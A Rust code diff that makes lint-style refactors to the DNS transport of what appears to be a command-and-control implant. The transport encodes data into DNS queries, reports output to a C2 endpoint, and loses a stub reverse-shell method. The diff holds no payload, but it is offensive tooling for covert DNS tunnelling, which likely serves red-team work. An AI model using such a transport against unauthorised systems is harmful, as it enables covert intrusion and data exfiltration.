@@ -19,6 +19,7 @@ const MAX_DATA_SIZE: usize = 50 * 1024 * 1024; // 50MB max data size
 
 /// DNS record type for queries
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
+#[allow(clippy::upper_case_acronyms)]
 pub enum DnsRecordType {
     TXT,  // Text records (default, base32 encoded)
     A,    // IPv4 address records (binary data)
@@ -27,6 +28,7 @@ pub enum DnsRecordType {
 
 /// DNS transport using stateless packet protocol with protobuf
 #[derive(Debug, Clone)]
+#[allow(clippy::upper_case_acronyms)]
 pub struct DNS {
     base_domain: String,
     dns_server: String,
@@ -107,7 +109,7 @@ impl DNS {
 
         // Calculate total length
         let base_domain_len = self.base_domain.len();
-        let num_labels = (encoded.len() + MAX_LABEL_LENGTH - 1) / MAX_LABEL_LENGTH;
+        let num_labels = encoded.len().div_ceil(MAX_LABEL_LENGTH);
         let total_len = encoded.len() + num_labels + base_domain_len; // +num_labels for dots between labels, +1 for dot before base_domain
 
         if total_len > MAX_DNS_NAME_LENGTH {
@@ -383,7 +385,7 @@ impl DNS {
             for (min_chunks, max_chunks) in varint_ranges.iter() {
                 // Calculate overhead assuming worst case (max sequence in this range)
                 let chunk_size = self.calculate_max_chunk_size(*max_chunks);
-                let total_chunks = ((request_data.len() + chunk_size - 1) / chunk_size).max(1);
+                let total_chunks = request_data.len().div_ceil(chunk_size).max(1);
 
                 // Check if the calculated total_chunks falls within this range
                 if total_chunks >= *min_chunks as usize && total_chunks <= *max_chunks as usize {
@@ -396,7 +398,7 @@ impl DNS {
             // Fallback for very large data
             result.unwrap_or_else(|| {
                 let chunk_size = self.calculate_max_chunk_size(2097151);
-                let total_chunks = ((request_data.len() + chunk_size - 1) / chunk_size).max(1);
+                let total_chunks = request_data.len().div_ceil(chunk_size).max(1);
                 (chunk_size, total_chunks)
             })
         };
@@ -1116,16 +1118,6 @@ impl Transport for DNS {
         self.dns_exchange(request, "/c2.C2/ReportOutput").await
     }
 
-    async fn reverse_shell(
-        &mut self,
-        _rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
-        _tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
-    ) -> Result<()> {
-        Err(anyhow::anyhow!(
-            "reverse_shell not supported over DNS transport"
-        ))
-    }
-
     fn get_type(&mut self) -> pb::c2::transport::Type {
         pb::c2::transport::Type::TransportDns
     }
@@ -1369,7 +1361,7 @@ mod tests {
             sequence: 1,
             conversation_id: "test1234".to_string(),
             data: vec![0xAA; 50], // 50 bytes of data
-            crc32: conv::calculate_crc32(&vec![0xAA; 50]),
+            crc32: conv::calculate_crc32(&[0xAA; 50]),
             acks: vec![],
             nacks: vec![],
         };
